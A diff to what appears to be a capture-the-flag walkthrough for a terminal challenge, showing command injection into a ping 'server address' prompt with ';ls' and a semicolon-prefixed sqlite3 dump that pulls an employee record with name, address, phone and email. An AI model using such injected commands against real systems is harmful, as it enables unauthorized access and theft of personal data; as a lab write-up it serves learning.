@@ -39,3 +39,26 @@ Terminal Challenge
 
 
  Please make a selection: 
+
+After typing ``2`` the following appears [#f1]_ :
+.. code-block:: none
+ Validating data store for employee onboard information.
+ Enter address of server: 
+We observed that if you type ``;ls`` it works as a normal shell.
+
+We see that the following items appear: ``menu.ps1``, ``onboard.db`` and ``runtoanswer``.
+Therefore, by using ``; /usr/bin/sqlite3 onboard.db .dump | grep 'Chan'`` we get:
+
+.. code-block:: none
+
+ Validating data store for employee onboard information.
+ Enter address of server: ; /usr/bin/sqlite3 onboard.db .dump | grep 'Chan'
+ Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
+             [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
+             [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
+             [-w deadline] [-W timeout] [hop1 ...] destination
+ INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
+ onboard.db: SQLite 3.x database
+ Press Enter to continue...: 
+
+Therefore mr Chan's name is Scott.
